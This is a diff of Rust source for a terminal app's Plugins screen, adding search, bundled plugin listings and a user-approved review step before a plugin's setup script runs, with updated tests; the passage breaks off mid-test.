@@ -88,10 +88,12 @@ pub struct PluginState {
     doing: bool,
     /// `rows` ran once this session: later runs get the short timeout
     ran: bool,
+    /// first line of its `about` file
+    pub about: String,
 }
 
 impl PluginState {
-    /// The plugins window's STATUS cell.
+    /// The Plugins screen's status cell.
     pub fn status(&self) -> &'static str {
         match &self.rows {
             _ if !self.plugin.on => "off",
@@ -110,6 +112,70 @@ impl PluginState {
     }
 }
 
+/// The Plugins screen, open.
+#[derive(Default)]
+pub struct PluginsWin {
+    /// an index into `plugins_items()`
+    pub sel: usize,
+    pub search: String,
+    /// typing goes to `search`
+    pub searching: bool,
+    /// the add form (a source), shown inside the screen
+    pub form: Option<Form>,
+    /// a setup script to approve, shown over the list
+    pub review: Option<Review>,
+}
+
+/// A setup script waiting for approval. `text` is what is shown and, on approve, exactly what
+/// runs (`setup_copy`); `<dir>/setup` is never read again.
+pub struct Review {
+    pub target: SetupTarget,
+    pub text: String,
+    /// the first display row shown (long lines wrap, so every byte can be scrolled to)
+    pub scroll: usize,
+    /// approve does nothing until `APPROVE_DELAY` after this: a stray Enter can't approve
+    pub opened: Instant,
+    /// the last frame's (display rows, box rows, box columns), set by the draw
+    pub view: std::cell::Cell<(usize, usize, usize)>,
+}
+
+/// How long after a review appears before Enter or a click can approve it.
+pub const APPROVE_DELAY: Duration = Duration::from_millis(700);
+
+pub enum SetupTarget {
+    /// a new plugin in staging: kept only if setup exits 0
+    Install(plugins::Staged),
+    /// an installed plugin, by name: run again in its folder, never rolled back
+    Rerun(String),
+}
+
+impl SetupTarget {
+    pub fn name(&self) -> &str {
+        match self {
+            SetupTarget::Install(s) => &s.name,
+            SetupTarget::Rerun(n) => n,
+        }
+    }
+}
+
+/// A setup script running in a tab, found by that tab's own handoff path (unique per tab).
+struct SetupRun {
+    tab: PathBuf,
+    target: SetupTarget,
+    /// the temp copy that runs; removed when it ends
+    copy: PathBuf,
+}
+
+/// One line of the Plugins screen's list.
+#[derive(Clone, Copy, Debug, PartialEq)]
+pub enum Item {
+    /// an index into `plugins`
+    Installed(usize),
+    /// an index into `available`
+    Available(usize),
+    AddButton,
+}
+
 /// What a plugin thread sends back.
 enum PluginMsg {
     Rows(String, Option<plugins::Rows>),
@@ -118,6 +184,10 @@ enum PluginMsg {
     Done(String, String),
     /// an add or update ended: the line for the flash bar
     Changed(String),
+    /// an install ended: the name it held (if known) and the line for the flash bar
+    Installed(Option<String>, String),
+    /// an install staged a plugin with a setup script: it waits for review
+    Review(plugins::Staged),
 }
 
 /// An Auto launch waiting for the model's pick.
@@ -171,10 +241,25 @@ pub struct App {
     update_rx: Option<std::sync::mpsc::Receiver<String>>,
     /// installed plugins by name; their rows come after the CLIs on home
     pub plugins: Vec<PluginState>,
-    /// the plugins window, open: its selected plugin (an index into `plugins`)
-    pub plugins_win: Option<usize>,
+    /// bundled plugins not installed
+    pub available: Vec<plugins::Available>,
+    pub plugins_win: Option<PluginsWin>,
     plugin_tx: std::sync::mpsc::Sender<PluginMsg>,
     plugin_rx: std::sync::mpsc::Receiver<PluginMsg>,
+    /// plugin names staging, in review or running setup: a second install of one waits
+    busy: Vec<String>,
+    /// staged installs waiting for the Plugins screen to show their review
+    pending: Vec<plugins::Staged>,
+    setups: Vec<SetupRun>,
+}
+
+/// Windows path with `/` for Git Bash (`C:/…`); other systems keep the path as is.
+fn to_bash_path(p: &str) -> String {
+    if cfg!(windows) {
+        p.replace('\\', "/")
+    } else {
+        p.to_string()
+    }
 }
 
 impl App {
@@ -216,9 +301,13 @@ impl App {
             update: None,
             update_rx: None,
             plugins: Vec::new(),
+            available: Vec::new(),
             plugins_win: None,
             plugin_tx,
             plugin_rx,
+            busy: Vec::new(),
+            pending: Vec::new(),
+            setups: Vec::new(),
         };
         app.refresh();
         app.reload_plugins();
@@ -258,13 +347,16 @@ impl App {
         let mut states = Vec::new();
         for p in plugins::list(&self.paths) {
             let old = self.plugins.iter().position(|s| s.plugin.name == p.name);
+            let about = plugins::about(&p.dir);
             states.push(match old {
                 Some(i) => PluginState {
                     plugin: p,
+                    about,
                     ..self.plugins.swap_remove(i)
                 },
                 None => PluginState {
                     plugin: p,
+                    about,
                     rows: None,
                     actions: Vec::new(),
                     loading: false,
@@ -274,6 +366,7 @@ impl App {
             });
         }
         self.plugins = states;
+        self.available = plugins::available(&self.paths);
         rows.extend(self.plugins.iter().flat_map(plugin_rows));
         self.rows = rows;
         self.failover = config::failover_on(&self.paths);
@@ -425,6 +518,14 @@ impl App {
             }
             return;
         }
+        if let Some(w) = &mut self.plugins_win {
+            if let Some(f) = &mut w.form {
+                f.paste(text);
+            } else if w.searching {
+                w.search.extend(text.chars().filter(|c| !c.is_control()));
+            }
+            return;
+        }
         if self.focus == Focus::Pane
             && let Some(p) = self.tabs.get(self.current).and_then(|t| t.pane.as_ref())
         {
@@ -487,8 +588,8 @@ impl App {
             }
             KeyCode::Char('x') => self.close_tab(),
             KeyCode::Char('a') => self.modal = Some(Modal::Form(Form::add())),
-            KeyCode::Char('p') => self.modal = Some(Modal::Form(Form::add_plugin())),
-            KeyCode::Char('P') => self.plugins_win = Some(0),
+            KeyCode::Char('p') => self.open_plugins(true),
+            KeyCode::Char('P') => self.open_plugins(false),
             KeyCode::Char('e') => self.start_edit(),
             KeyCode::Char('d') => self.start_delete(),
             KeyCode::Tab => {
@@ -533,6 +634,12 @@ impl App {
             // a failed switch: try the switch again, the session is still there
             (Some(Notice::Error(_)), KeyCode::Enter) if tab.done && tab.session.is_some() => {
                 self.retry(self.current)
+            }
+            // a setup tab has nothing to start again
+            (Some(Notice::Ended { .. } | Notice::Error(_)), KeyCode::Enter)
+                if tab.member.starts_with("setup:") =>
+            {
+                self.close_tab()
             }
             (Some(Notice::Ended { .. } | Notice::Error(_)), KeyCode::Enter) => {
                 let member = tab.member.clone();
@@ -579,6 +686,9 @@ impl App {
                     Err(e) => format!("Could not update {name}: {e}"),
                 });
             }
+            KeyCode::Char('d') if self.busy.iter().any(|n| n == name) => {
+                self.say(format!("{name} is busy: remove it after its setup ends."))
+            }
             KeyCode::Char('d') => {
                 self.modal = Some(Modal::Confirm(Confirm {
                     id: format!("plugin:{name}"),
@@ -597,28 +707,370 @@ impl App {
         true
     }
 
-    /// The plugins window: the selected plugin's keys are its home section's keys.
+    /// Opens the Plugins screen, with the add form open or not.
+    fn open_plugins(&mut self, form: bool) {
+        self.plugins_win = Some(PluginsWin {
+            form: form.then(Form::add_plugin),
+            ..PluginsWin::default()
+        });
+        self.next_review();
+    }
+
+    /// The Plugins screen's list: installed, then available, then the add button; filtered by
+    /// the search text (case-insensitive, in the name or `about`).
+    pub fn plugins_items(&self) -> Vec<Item> {
+        let q = self
+            .plugins_win
+            .as_ref()
+            .map(|w| w.search.to_lowercase())
+            .unwrap_or_default();
+        let hit = |name: &str, about: &str| {
+            name.to_lowercase().contains(&q) || about.to_lowercase().contains(&q)
+        };
+        let installed = self.plugins.iter().enumerate();
+        let mut items: Vec<Item> = installed
+            .filter(|(_, s)| hit(&s.plugin.name, &s.about))
+            .map(|(i, _)| Item::Installed(i))
+            .collect();
+        let available = self.available.iter().enumerate();
+        items.extend(
+            available
+                .filter(|(_, p)| hit(&p.name, &p.about))
+                .map(|(i, _)| Item::Available(i)),
+        );
+        items.push(Item::AddButton);
+        items
+    }
+
+    /// The Plugins screen's keys. Esc closes the innermost thing: the form, the search text,
+    /// search itself, then the screen.
     fn plugins_win_key(&mut self, key: KeyEvent) {
-        let last = self.plugins.len().saturating_sub(1);
-        let sel = self.plugins_win.unwrap_or(0).min(last);
-        let name = self.plugins.get(sel).map(|s| s.plugin.name.clone());
+        let Some(w) = self.plugins_win.as_mut() else {
+            return;
+        };
+        if let Some(r) = w.review.as_mut() {
+            let (rows, h, _) = r.view.get();
+            let last = rows.saturating_sub(h);
+            match key.code {
+                KeyCode::Up => r.scroll = r.scroll.saturating_sub(1),
+                KeyCode::Down => r.scroll = (r.scroll + 1).min(last),
+                KeyCode::PageUp => r.scroll = r.scroll.saturating_sub(10),
+                KeyCode::PageDown => r.scroll = (r.scroll + 10).min(last),
+                KeyCode::Enter => self.approve(),
+                KeyCode::Esc => self.cancel_review(),
+                _ => {}
+            }
+            return;
+        }
+        if let Some(mut f) = w.form.take() {
+            match f.key(key) {
+                Outcome::Open => w.form = Some(f),
+                Outcome::Cancel => {}
+                Outcome::Save => {
+                    if let Err(e) = self.save_form(&f) {
+                        f.error = Some(e);
+                        if let Some(w) = self.plugins_win.as_mut() {
+                            w.form = Some(f);
+                        }
+                    }
+                }
+            }
+            return;
+        }
+        if w.searching {
+            match key.code {
+                KeyCode::Esc if !w.search.is_empty() => w.search.clear(),
+                KeyCode::Esc | KeyCode::Enter | KeyCode::Up | KeyCode::Down => w.searching = false,
+                KeyCode::Backspace => {
+                    w.search.pop();
+                }
+                KeyCode::Char(c) if !key.modifiers.contains(KeyModifiers::CONTROL) => {
+                    w.search.push(c);
+                    w.sel = 0;
+                }
+                _ => {}
+            }
+            return;
+        }
+        let items = self.plugins_items();
+        let Some(w) = self.plugins_win.as_mut() else {
+            return;
+        };
+        let sel = w.sel.min(items.len() - 1);
+        w.sel = sel;
+        let name = match items[sel] {
+            Item::Installed(i) => Some(self.plugins[i].plugin.name.clone()),
+            _ => None,
+        };
         match key.code {
+            KeyCode::Esc if !w.search.is_empty() => w.search.clear(),
             KeyCode::Esc | KeyCode::Char('q') => self.plugins_win = None,
-            KeyCode::Up | KeyCode::Char('k') => self.plugins_win = Some(sel.saturating_sub(1)),
-            KeyCode::Down | KeyCode::Char('j') => self.plugins_win = Some((sel + 1).min(last)),
-            KeyCode::Char('+' | 'p') => self.modal = Some(Modal::Form(Form::add_plugin())),
-            KeyCode::Enter | KeyCode::Char('a' | 'o' | 'u' | 'd') => {
+            KeyCode::Up | KeyCode::Char('k') => w.sel = sel.saturating_sub(1),
+            KeyCode::Down | KeyCode::Char('j') => w.sel = (sel + 1).min(items.len() - 1),
+            KeyCode::Char('/') => w.searching = true,
+            KeyCode::Enter | KeyCode::Char('a') if name.is_some() => {
+                self.plugin_key(name.as_deref().unwrap_or(""), false, KeyCode::Char('a'));
+            }
+            KeyCode::Enter | KeyCode::Char('+') => match items[sel] {
+                Item::Available(i) => self.install(self.available[i].name.clone()),
+                _ => w.form = Some(Form::add_plugin()),
+            },
+            KeyCode::Char('s') => {
                 if let Some(name) = name {
-                    let code = match key.code {
-                        KeyCode::Enter => KeyCode::Char('a'),
+                    self.open_review(SetupTarget::Rerun(name));
+                }
+            }
+            KeyCode::Char(c @ (' ' | 'o' | 'u' | '-')) => {
+                if let Some(name) = name {
+                    let c = match c {
+                        ' ' => 'o',
+                        '-' => 'd',
                         c => c,
                     };
-                    self.plugin_key(&name, false, code);
+                    self.plugin_key(&name, false, KeyCode::Char(c));
                 }
             }
             _ => {}
         }
         self.refresh();
+    }
+
+    /// Stages `source` and installs it on a thread (git may take a while); the result goes to
+    /// the flash bar, then plugins reload. A setup script goes to the review screen first.
+    /// A name already staging, in review or running setup is left alone: staging again would
+    /// remove its live staging folder.
+    fn install(&mut self, source: String) {
+        let name = plugins::source_name(&source).ok().map(|(n, _)| n);
+        if let Some(n) = &name {
+            if self.busy.contains(n) {
+                return self.say(format!("{n} is already being installed."));
+            }
+            self.busy.push(n.clone());
+        }
+        let paths = self.paths.clone();
+        let shown = plugins::hide_userinfo(&source);
+        self.say(format!("Installing {shown}…"));
+        let tx = self.plugin_tx.clone();
+        std::thread::spawn(move || {
+            let failed = |e: String| format!("Could not install {shown}: {e}");
+            let line = match plugins::stage(&paths, &source) {
+                Ok(s) if s.setup.is_some() => {
+                    let _ = tx.send(PluginMsg::Review(s));
+                    return;
+                }
+                Ok(s) => plugins::commit(&paths, &s).unwrap_or_else(failed),
+                Err(e) => failed(e),
+            };
+            let _ = tx.send(PluginMsg::Installed(name, line));
+        });
+    }
+
+    /// Shows a setup script for approval: a staged install's, or an installed plugin's own
+    /// (read now; what is shown is what runs).
+    fn open_review(&mut self, target: SetupTarget) {
+        let name = target.name().to_string();
+        let text = match &target {
+            SetupTarget::Install(s) => s.setup.clone(),
+            SetupTarget::Rerun(_) if self.busy.contains(&name) => {
+                return self.say(format!("{name} is busy."));
+            }
+            SetupTarget::Rerun(_) => {
+                let dir = self.plugin(&name).map(|s| s.plugin.dir.clone());
+                match dir.map(|d| plugins::setup_text(&d)) {
+                    Some(Ok(t)) => t,
+                    Some(Err(e)) => return self.say(format!("{name}: {e}")),
+                    None => return,
+                }
+            }
+        };
+        let Some(text) = text else {
+            return self.say("no setup script");
+        };
+        // only inside the Plugins screen, one at a time: never over a CLI that is taking keys
+        let Some(w) = self.plugins_win.as_mut().filter(|w| w.review.is_none()) else {
+            let open = self.plugins_win.is_some();
+            match target {
+                SetupTarget::Install(s) => {
+                    self.pending.push(s);
+                    self.say(if open {
+                        format!("{name} ready to review after this one.")
+                    } else {
+                        format!("{name} ready to review: open Plugins")
+                    });
+                }
+                SetupTarget::Rerun(_) => self.say(format!("{name}: finish the open review first.")),
+            }
+            return;
+        };
+        w.review = Some(Review {
+            target,
+            text,
+            scroll: 0,
+            opened: Instant::now(),
+            view: std::cell::Cell::new((0, 0, 0)),
+        });
+        if !self.busy.contains(&name) {
+            self.busy.push(name);
+        }
+    }
+
+    /// Opens the next staged install waiting for review, if the Plugins screen is free.
+    fn next_review(&mut self) {
+        if self
+            .plugins_win
+            .as_ref()
+            .is_some_and(|w| w.review.is_none())
+            && !self.pending.is_empty()
+        {
+            let s = self.pending.remove(0);
+            self.open_review(SetupTarget::Install(s));
+        }
+    }
+
+    fn cancel_review(&mut self) {
+        let Some(r) = self.plugins_win.as_mut().and_then(|w| w.review.take()) else {
+            return;
+        };
+        self.busy.retain(|n| n != r.target.name());
+        match &r.target {
+            SetupTarget::Install(s) => {
+                plugins::abort(s);
+                self.say("cancelled: plugin not installed");
+            }
+            SetupTarget::Rerun(_) => self.say("cancelled: setup not run"),
+        }
+        self.next_review();
+    }
+
+    /// Runs the reviewed text (a temp copy of it) as `bash <copy>` in a new `setup:<name>` tab,
+    /// in the staging folder (install) or the plugin's folder (rerun, after `config.bak`).
+    fn approve(&mut self) {
+        let Some(r) = self.plugins_win.as_ref().and_then(|w| w.review.as_ref()) else {
+            return;
+        };
+        if r.opened.elapsed() < APPROVE_DELAY {
+            return;
+        }
+        let (_, h, w) = r.view.get();
+        // nothing of the script shown (or not drawn yet): nothing to approve
+        if h == 0 || w == 0 {
+            return self.say("window too small to review");
+        }
+        let Some(r) = self.plugins_win.as_mut().and_then(|w| w.review.take()) else {
+            return;
+        };
+        let name = r.target.name().to_string();
+        let dir = match &r.target {
+            SetupTarget::Install(s) => Ok(s.dir.clone()),
+            SetupTarget::Rerun(n) => match self.plugin(n).map(|s| s.plugin.dir.clone()) {
+                Some(d) => plugins::backup_config(&d)
+                    .map(|()| d)
+                    .map_err(|e| format!("could not back up config: {e}")),
+                None => Err("no longer installed".into()),
+            },
+        };
+        let started = dir.and_then(|d| plugins::setup_copy(&r.text).map(|c| (d, c)));
+        let (dir, copy) = match started {
+            Ok(v) => v,
+            Err(e) => {
+                if let SetupTarget::Install(s) = &r.target {
+                    plugins::abort(s);
+                }
+                self.busy.retain(|n| *n != name);
+                return self.say(format!("setup of {name} not run: {e}"));
+            }
+        };
+        self.plugins_win = None;
+        self.next_handoff += 1;
+        let tab = self.paths.fo_state.join(format!(
+            "handoff.{}.{}.json",
+            std::process::id(),
+            self.next_handoff
+        ));
+        self.tabs.push(Tab {
+            member: format!("setup:{name}"),
+            pane: None,
+            notice: None,
+            handoff: tab.clone(),
+            tried: Vec::new(),
+            split: Split::default(),
+            session: None,
+            done: false,
+        });
+        self.current = self.tabs.len() - 1;
+        self.focus = Focus::Pane;
+        let d = dir.to_string_lossy();
+        // Git Bash takes C:/x for sure; backslashes are left to its path guessing
+        let bash_path = |p: &str| shell_quote(&to_bash_path(p));
+        let command = format!(
+            "cd {} && bash {}",
+            bash_path(&d),
+            bash_path(&copy.to_string_lossy())
+        );
+        let env = vec![("AI_PLUGIN_DIR".to_string(), Some(to_bash_path(&d)))];
+        let (rows, cols) = self.pane_size;
+        match Pane::spawn(&command, &[], &env, rows, cols) {
+            Ok(p) => self.tabs[self.current].pane = Some(p),
+            // no pane: `tick` ends it as a failure
+            Err(e) => {
+                self.tabs[self.current].notice =
+                    Some(Notice::Error(format!("could not start setup: {e}")))
+            }
+        }
+        self.setups.push(SetupRun {
+            tab,
+            target: r.target,
+            copy,
+        });
+    }
+
+    /// Ends setups whose tab exited (or closed, or never started): an install is kept only on
+    /// exit 0; a rerun keeps the plugin either way. The temp copy goes.
+    fn finish_setups(&mut self) {
+        let mut i = 0;
+        while i < self.setups.len() {
+            let tab = self
+                .tabs
+                .iter_mut()
+                .find(|t| t.handoff == self.setups[i].tab);
+            let code = match tab.map(|t| t.pane.as_mut().map(Pane::exited)) {
+                // still running
+                Some(Some(None)) => {
+                    i += 1;
+                    continue;
+                }
+                Some(Some(Some(c))) => Some(c),
+                // closed, or it never started
+                _ => None,
+            };
+            let run = self.setups.remove(i);
+            let _ = std::fs::remove_file(&run.copy);
+            let name = run.target.name().to_string();
+            self.busy.retain(|n| *n != name);
+            let why = code.map_or("tab closed".to_string(), |c| format!("exit {c}"));
+            match run.target {
+                SetupTarget::Install(s) if code == Some(0) => {
+                    let paths = self.paths.clone();
+                    self.say(format!("Installing {name}…"));
+                    self.busy.push(name.clone());
+                    // commit warms `rows` (up to 10 s): off the UI thread
+                    let tx = self.plugin_tx.clone();
+                    std::thread::spawn(move || {
+                        let line = match plugins::commit(&paths, &s) {
+                            Ok(_) => format!("installed plugin {name}"),
+                            Err(e) => format!("Could not install {name}: {e}"),
+                        };
+                        let _ = tx.send(PluginMsg::Installed(Some(name), line));
+                    });
+                }
+                SetupTarget::Install(s) => {
+                    plugins::abort(&s);
+                    self.say(format!("setup failed ({why}): plugin not installed"));
+                }
+                SetupTarget::Rerun(_) if code == Some(0) => self.say("setup done"),
+                SetupTarget::Rerun(_) => self.say(format!("setup failed ({why})")),
+            }
+        }
     }
 
     /// Runs a plugin add or update on a thread (git may take a while); `job`'s line goes to
@@ -695,7 +1147,7 @@ impl App {
         self.say(if self.wrr {
             "Mode: failover."
         } else {
-            "Round-robin: n or ▶ Auto opens next."
+            "Round-robin: n or › Auto opens next."
         });
     }
 
@@ -845,17 +1297,7 @@ impl App {
     fn save_form(&mut self, f: &Form) -> Result<(), String> {
         let (label, command) = (f.get("Label"), f.get("Command"));
         match &f.purpose {
-            Purpose::AddPlugin => {
-                let (paths, source) = (self.paths.clone(), plugins::expand_home(&f.get("Source")));
-                self.say(format!("Installing {}…", plugins::hide_userinfo(&source)));
-                self.in_background(move || match plugins::add(&paths, &source) {
-                    Ok(name) => format!(
-                        "Installed plugin {name} from {}.",
-                        plugins::hide_userinfo(&source)
-                    ),
-                    Err(e) => format!("Could not install {}: {e}", plugins::hide_userinfo(&source)),
-                });
-            }
+            Purpose::AddPlugin => self.install(plugins::expand_home(&f.get("Source"))),
             Purpose::Action(name) => {
                 let action = self
                     .plugins
@@ -1060,14 +1502,28 @@ impl App {
             }
             return;
         }
-        if self.plugins_win.is_some() {
-            if let MouseEventKind::Down(MouseButton::Left) = m.kind {
-                if let Some((_, i)) = hits.plugin_rows.iter().find(|(r, _)| inside(r)) {
-                    self.plugins_win = Some(*i);
-                }
-                if let Some((_, name)) = hits.plugins.iter().find(|(r, _)| inside(r)) {
-                    self.toggle_plugin(&name.clone());
-                }
+        if let Some(w) = &mut self.plugins_win {
+            if m.kind != MouseEventKind::Down(MouseButton::Left) {
+                return;
+            }
+            if hits
+                .buttons
+                .iter()
+                .any(|(r, b)| *b == Button::Home && inside(r))
+            {
+                self.plugins_win = None;
+                return;
+            }
+            // a click is never text for the form or the search
+            if w.form.is_some() && w.review.is_none() {
+                return;
+            }
+            w.searching = false;
+            if let Some((_, i, code)) = hits.plugin_btns.iter().find(|(r, ..)| inside(r)) {
+                w.sel = *i;
+                self.plugins_win_key(KeyEvent::new(*code, KeyModifiers::NONE));
+            } else if let Some((_, i)) = hits.plugin_rows.iter().find(|(r, _)| inside(r)) {
+                w.sel = *i;
             }
             return;
         }
@@ -1090,8 +1546,8 @@ impl App {
             if let Some((_, b)) = hits.buttons.iter().find(|(r, _)| inside(r)) {
                 match b {
                     Button::Add => self.modal = Some(Modal::Form(Form::add())),
-                    Button::AddPlugin => self.modal = Some(Modal::Form(Form::add_plugin())),
-                    Button::Plugins => self.plugins_win = Some(0),
+                    Button::AddPlugin => self.open_plugins(true),
+                    Button::Plugins => self.open_plugins(false),
                     Button::Edit => self.start_edit(),
                     Button::Delete => self.start_delete(),
                     Button::Failover => config::set_failover(&self.paths, !self.failover),
@@ -1434,8 +1890,16 @@ impl App {
                     self.refresh();
                     self.reload_plugins();
                 }
+                PluginMsg::Installed(name, line) => {
+                    self.busy.retain(|n| Some(n) != name.as_ref());
+                    self.say(line);
+                    self.refresh();
+                    self.reload_plugins();
+                }
+                PluginMsg::Review(s) => self.open_review(SetupTarget::Install(s)),
             }
         }
+        self.finish_setups();
         if changed {
             self.refresh();
         }
@@ -1664,6 +2128,12 @@ mod tests {
     use ratatui::layout::Rect;
     use std::fs;
     use std::sync::atomic::{AtomicUsize, Ordering};
+
+    #[test]
+    fn bash_path_uses_slashes_only_on_windows() {
+        let want = if cfg!(windows) { "C:/a/b" } else { "C:\\a\\b" };
+        assert_eq!(to_bash_path("C:\\a\\b"), want);
+    }
 
     static N: AtomicUsize = AtomicUsize::new(0);
 
@@ -2681,7 +3151,6 @@ esac"#;
         let src2 = a.paths.home.join("src/mine");
         fs::create_dir_all(src2.parent().unwrap()).unwrap();
         fs::rename(&src, &src2).unwrap();
-        let flash = |a: &App| a.flash.as_ref().map(|(m, _)| m.clone()).unwrap_or_default();
         for want in ["Installed plugin mine", "already"] {
             key(&mut a, KeyCode::Char('p'));
             a.on_paste(&src2.to_string_lossy());
@@ -2690,6 +3159,7 @@ esac"#;
             assert!(a.modal.is_none(), "the add runs in the background");
             settle(&mut a, |a| flash(a).contains(want));
             assert!(flash(&a).contains(want), "{}", flash(&a));
+            key(&mut a, KeyCode::Esc);
         }
         assert!(a.paths.plugins.join("mine/plugin").is_file());
         assert!(
@@ -2732,12 +3202,12 @@ esac"#;
         }
     }
 
-    // ── plugins window ────────────────────────────────────
+    // ── plugins screen ────────────────────────────────────
 
-    /// The screen as text lines, and where things were drawn.
-    fn screen(a: &App) -> (Vec<String>, Hits) {
+    /// The screen as text lines at `w` columns, and where things were drawn.
+    fn screen_at(a: &App, w: u16) -> (Vec<String>, Hits) {
         use ratatui::{Terminal, backend::TestBackend};
-        let mut t = Terminal::new(TestBackend::new(110, 40)).unwrap();
+        let mut t = Terminal::new(TestBackend::new(w, 40)).unwrap();
         let mut hits = Hits::default();
         t.draw(|f| hits = crate::ui::draw(f, a)).unwrap();
         let b = t.backend().buffer();
@@ -2745,6 +3215,10 @@ esac"#;
             .map(|y| (0..b.area.width).map(|x| b[(x, y)].symbol()).collect())
             .collect();
         (lines, hits)
+    }
+
+    fn screen(a: &App) -> (Vec<String>, Hits) {
+        screen_at(a, 110)
     }
 
     fn line_with(lines: &[String], text: &str) -> String {
@@ -2755,46 +3229,46 @@ esac"#;
             .unwrap_or_else(|| panic!("no line with {text}:\n{}", lines.join("\n")))
     }
 
-    fn pwin_select(a: &mut App, name: &str) {
-        a.plugins_win = a.plugins.iter().position(|s| s.plugin.name == name);
-        assert!(a.plugins_win.is_some(), "no plugin {name}");
-    }
-
-    #[test]
-    fn plugins_window_opens_with_shift_p_and_its_button_and_closes_on_esc_or_q() {
-        let mut a = app();
-        a.on_key(KeyEvent::new(KeyCode::Char('P'), KeyModifiers::SHIFT));
-        assert_eq!(a.plugins_win, Some(0));
-        key(&mut a, KeyCode::Esc);
-        assert_eq!(a.plugins_win, None);
-        let (_, hits) = screen(&a);
-        let b = hits
-            .buttons
+    fn line_no(lines: &[String], text: &str) -> usize {
+        lines
             .iter()
-            .find(|(_, b)| *b == Button::Plugins)
-            .expect("a ⚙ Plugins button")
-            .0;
-        assert!(hits.buttons.iter().any(|(_, b)| *b == Button::AddPlugin));
-        click(&mut a, &hits, b.x, b.y);
-        assert_eq!(a.plugins_win, Some(0));
-        key(&mut a, KeyCode::Char('q'));
-        assert_eq!(a.plugins_win, None);
-        assert!(!a.quit, "q closes the window, not the app");
+            .position(|l| l.contains(text))
+            .unwrap_or_else(|| panic!("no line with {text}:\n{}", lines.join("\n")))
     }
 
-    #[test]
-    fn plugins_window_empty_state() {
-        let mut a = app();
-        key(&mut a, KeyCode::Char('P'));
-        let (lines, _) = screen(&a);
-        line_with(&lines, "No plugins yet · + add plugin");
-        key(&mut a, KeyCode::Char('+'));
-        assert!(matches!(&a.modal, Some(Modal::Form(f)) if f.purpose == Purpose::AddPlugin));
+    fn flash(a: &App) -> String {
+        a.flash.as_ref().map(|(m, _)| m.clone()).unwrap_or_default()
+    }
+
+    /// Opens the screen and puts the cursor on installed plugin `name`.
+    fn pwin_select(a: &mut App, name: &str) {
+        if a.plugins_win.is_none() {
+            a.focus = Focus::Home;
+            key(a, KeyCode::Char('P'));
+        }
+        let i = a.plugins.iter().position(|s| s.plugin.name == name);
+        let at = a
+            .plugins_items()
+            .iter()
+            .position(|it| Some(*it) == i.map(Item::Installed))
+            .unwrap_or_else(|| panic!("no plugin {name}"));
+        a.plugins_win.as_mut().unwrap().sel = at;
+    }
+
+    fn names_of(a: &App) -> Vec<String> {
+        a.plugins_items()
+            .iter()
+            .map(|it| match it {
+                Item::Installed(i) => a.plugins[*i].plugin.name.clone(),
+                Item::Available(i) => format!("+{}", a.available[*i].name),
+                Item::AddButton => "add".into(),
+            })
+            .collect()
     }
 
     #[cfg(unix)]
     #[test]
-    fn plugins_window_lists_every_plugin_with_state_source_and_status() {
+    fn plugins_screen_lists_installed_then_available_then_add() {
         let mut a = plugin_app();
         let git = plugin_script(&a, "gitp", GOOD);
         fs::write(
@@ -2802,93 +3276,711 @@ esac"#;
             "https://me:secret@example.com/x/gitp.git\n",
         )
         .unwrap();
-        plugins::add(&a.paths, "cliproxy").unwrap();
-        fs::write(a.paths.plugins.join("cliproxy/.off"), "").unwrap();
+        fs::create_dir_all(git.join(".git")).unwrap();
+        fs::write(a.paths.plugins.join("good/about"), "Team gateway\n").unwrap();
         a.refresh();
         a.reload_plugins();
         settle(&mut a, |a| a.plugins.iter().all(|p| !p.loading));
-        key(&mut a, KeyCode::Char('P'));
-        let (lines, _) = screen(&a);
-        let names: Vec<&str> = a.plugins.iter().map(|s| s.plugin.name.as_str()).collect();
-        assert_eq!(names, ["bad", "cliproxy", "gitp", "good", "offp", "slow"]);
-        line_with(&lines, "NAME");
-        for (name, state, source, status) in [
-            ("good", "● on", "local", "ok"),
-            ("bad", "● on", "local", "failed"),
-            ("offp", "○ off", "local", "off"),
-            ("cliproxy", "○ off", "bundled", "off"),
-            ("gitp", "● on", "https://example.com/x/gitp.git", "ok"),
-        ] {
-            // the window's row, not home's section header under it
-            let l = lines
-                .iter()
-                .find(|l| l.contains(&format!(" {name} ")) && l.contains('│'))
-                .unwrap_or_else(|| panic!("no row for {name}:\n{}", lines.join("\n")));
-            assert!(l.contains(state), "{name}: {l}");
-            assert!(l.contains(source), "{name}: {l}");
-            let cells = l.split('│').find(|c| c.contains(name)).unwrap();
-            assert_eq!(cells.split_whitespace().last(), Some(status), "{name}: {l}");
-        }
-        assert!(!lines.iter().any(|l| l.contains("secret")));
-        line_with(&lines, " remove ");
-    }
-
-    #[cfg(unix)]
-    #[test]
-    fn plugins_window_o_and_a_click_on_the_pill_toggle_the_off_file() {
-        let mut a = plugin_app();
-        let off = a.paths.plugins.join("good/.off");
-        key(&mut a, KeyCode::Char('P'));
-        pwin_select(&mut a, "good");
-        key(&mut a, KeyCode::Char('o'));
-        assert!(off.exists());
-        key(&mut a, KeyCode::Char('o'));
-        assert!(!off.exists());
-        // ↓ selects the next row; a click on a row selects it, on its pill toggles it
-        key(&mut a, KeyCode::Down);
-        assert_eq!(a.plugins[a.plugins_win.unwrap()].plugin.name, "offp");
+        // P and the home button open it; q and esc close it, never the app
+        a.on_key(KeyEvent::new(KeyCode::Char('P'), KeyModifiers::SHIFT));
+        assert!(a.plugins_win.is_some());
+        key(&mut a, KeyCode::Char('q'));
+        assert!(a.plugins_win.is_none() && !a.quit);
         let (_, hits) = screen(&a);
-        let (row, i) = hits.plugin_rows[0];
-        click(&mut a, &hits, row.x, row.y);
-        assert_eq!(a.plugins_win, Some(i));
-        let good = a
-            .plugins
+        let b = hits
+            .buttons
             .iter()
-            .position(|s| s.plugin.name == "good")
-            .unwrap();
-        let pill = hits.plugins.iter().find(|(_, n)| n == "good").unwrap().0;
-        click(&mut a, &hits, pill.x, pill.y);
-        assert_eq!(a.plugins_win, Some(good));
-        assert!(off.exists());
-        assert!(a.plugins_win.is_some(), "the window stays open");
+            .find(|(_, b)| *b == Button::Plugins)
+            .unwrap()
+            .0;
+        click(&mut a, &hits, b.x, b.y);
+        assert!(a.plugins_win.as_ref().is_some_and(|w| w.form.is_none()));
+        assert_eq!(
+            names_of(&a),
+            ["bad", "gitp", "good", "offp", "slow", "+cliproxy", "add"]
+        );
+        for w in [80, 120] {
+            let (lines, _) = screen_at(&a, w);
+            line_with(&lines, "5 installed · 1 available");
+            line_with(&lines, "search:");
+            let order = [
+                "INSTALLED",
+                " bad ",
+                " good ",
+                "AVAILABLE · bundled",
+                " cliproxy ",
+                "[+ Add from git / folder]",
+            ]
+            .map(|t| line_no(&lines, t));
+            assert!(order.windows(2).all(|p| p[0] < p[1]), "{order:?}");
+            for (name, want) in [
